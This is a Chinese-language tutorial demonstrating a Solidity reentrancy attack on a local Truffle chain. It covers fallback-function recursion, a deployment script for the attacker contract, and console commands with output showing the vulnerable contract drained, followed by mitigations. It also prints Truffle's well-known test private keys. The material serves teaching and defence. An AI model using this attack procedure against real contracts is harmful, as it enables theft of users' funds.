

## 知识点
- [Fallback Function](https://solidity.readthedocs.io/en/develop/contracts.html?#fallback-function)

- 智能合约通过常规的转账接收Ether时，必须定义一个 fallback 函数并且标记为payable， 当接收Ether时被触发调用；

- 例如：若有constract A 和 B, 当 B 调用 A 函数 方法中包含 `call` 操作时， 会触发B 中的 fallback 函数 ， 可重入攻击利用该原理进行函数递归操作提取Ether；

## 智能合约描述
- Reentrancy<BR>
    可接收别的钱包或Constract的 Ether代币

- ReentrancyAttack  
    是攻击智能合约， 通过 payable put 函数接收Ether代币，并发送给Reentrancy 智能合约， 并进行提现操作， 当调用到call函数时触发fallback函数，进行递归操作 进行提现 ;

## 测试
- 获取开发环境钱包地址
```
prod@ubuntu:~/solidity/example01$ truffle develop
Truffle Develop started at http://127.0.0.1:9545/

Accounts:
(0) 0x627306090abab3a6e1400e9345bc60c78a8bef57
(1) 0xf17f52151ebef6c7334fad080c5704d77216b732
(2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef
(3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544
(4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2
(5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e
(6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5
(7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5
(8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc
(9) 0x5aeda56215b167893e80b4fe645ba6d5bab767de

Private Keys:
(0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3
(1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f
(2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1
(3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c
(4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418
(5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63
(6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8
(7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7
(8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4
(9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5

Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat

⚠️  Important ⚠️  : This mnemonic was created for you by Truffle. It is not secure.
Ensure you do not use it on production blockchains, or else you risk losing funds.

truffle(develop)> web3.eth.accounts[0]
'0x627306090abab3a6e1400e9345bc60c78a8bef57'
truffle(develop)> web3.eth.accounts[1]
'0xf17f52151ebef6c7334fad080c5704d77216b732'

```
- 修改migrations下 2_deploy_reentrancy.js 文件
```js
var Reentrancy = artifacts.require("Reentrancy");
var ReentrancyAttack = artifacts.require("ReentrancyAttack");

module.exports = function(deployer) {

    deployer.deploy(Reentrancy).then(
        () => deployer.deploy(
            ReentrancyAttack, 
            Reentrancy.address, 
            {from: "0xf17f52151ebef6c7334fad080c5704d77216b732"}) // 指定owner地址为 accounts[1] 
    );
};

```

- Migrate
```bash
truffle(develop)> migrate -f 2
Compiling ./contracts/Migrations.sol...
Compiling ./contracts/Reentrancy.sol...
Compiling ./contracts/ReentrancyAttack.sol...
Writing artifacts to ./build/contracts

Using network 'develop'.

Running migration: 2_deploy_reentrancy.js
  Deploying Reentrancy...
  ... 0x140580f72dca073bdf80941465eb515b442b16fefdc2f2090bad8edcc4e877f6
  Reentrancy: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0
  Deploying ReentrancyAttack...
  ... 0x7a9e367e1b939df04c956e62b49a722cba1aca82859c05e268a06147b3e36b09
  ReentrancyAttack: 0x2e2d10b41b7c8ddb995568a87185428d9a513ead
Saving artifacts...
```

- 测试

```js
// 查看 合约部署地址
Reentrancy.deployed().then(instance => raddress = instance.address);
ReentrancyAttack.deployed().then(instance => ataddress = instance.address);

// 从 Account4 向 Reentrancy 合约 put 5 个 Ether
Reentrancy.deployed().then(instance => instance.put({from: web3.eth.accounts[3], value: web3.toWei(5, "ether")}));
// 从 Account5 向 ReentrancyAttack 合约 put 2 个 Ether, 并盗取4个Ether 到 ReentrancyAttack合约地址上， ReentrancyAttack 合约上会拥有 6 个 Ether
ReentrancyAttack.deployed().then(instance => instance.put({from: web3.eth.accounts[1], value: web3.toWei(2, "ether")}))

web3.eth.getBalance(raddress);
web3.eth.getBalance(ataddress);

```

```bash
# 查看
truffle(develop)> Reentrancy.deployed().then(instance => raddress = instance.address);
'0x8cdaf0cd259887258bc13a92c0a6da92698644c0'
truffle(develop)> ReentrancyAttack.deployed().then(instance => ataddress = instance.address);
'0x2e2d10b41b7c8ddb995568a87185428d9a513ead'

# accounts[3] 转账到智能合约 Reentrancy
truffle(develop)> Reentrancy.deployed().then(instance => instance.put({from: web3.eth.accounts[3], value: web3.toWei(5, "ether")}));
{ tx: '0x97280e6bfbe2b70b645af221c20d30d4df7806b46b4b4fbff47d5ff2016745aa',
  receipt: 
   { transactionHash: '0x97280e6bfbe2b70b645af221c20d30d4df7806b46b4b4fbff47d5ff2016745aa',
     transactionIndex: 0,
     blockHash: '0x648ac7e14cde711ccfc3c4316df36ebc17e8d478ffad52a278727323ff92ef4d',
     blockNumber: 3,
     gasUsed: 41746,
     cumulativeGasUsed: 41746,
     contractAddress: null,
     logs: [],
     status: '0x01',
     logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' },
  logs: [] }

# account1 通过 ReentrancyAttack进行转账 但是会盗取 Reentrancy 合约的 Ether
truffle(develop)> ReentrancyAttack.deployed().then(instance => instance.put({from: web3.eth.accounts[1], value: web3.toWei(2, "ether")}))
{ tx: '0xa4176f77239d779018edcc5224d250f949edafaf6d37d1e5acf04c252457962f',
  receipt: 
   { transactionHash: '0xa4176f77239d779018edcc5224d250f949edafaf6d37d1e5acf04c252457962f',
     transactionIndex: 0,
     blockHash: '0x876a22140c1dedd8dc386bff84e2b904bcd166aa989026df7a6d95a52ae2384b',
     blockNumber: 4,
     gasUsed: 81879,
     cumulativeGasUsed: 81879,
     contractAddress: null,
     logs: [],
     status: '0x01',
     logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' },
  logs: [] }

# 查看最后余额 。。。 满足期望值
truffle(develop)> web3.eth.getBalance(raddress)
BigNumber { s: 1, e: 18, c: [ 10000 ] }
truffle(develop)> web3.eth.getBalance(ataddress)
BigNumber { s: 1, e: 18, c: [ 60000 ] }

```


## 如何避免
- 转账操作尽量避免使用 call 方法， 使用transfer or send；
- 在进行转账前，对balance中该地址赋值为0；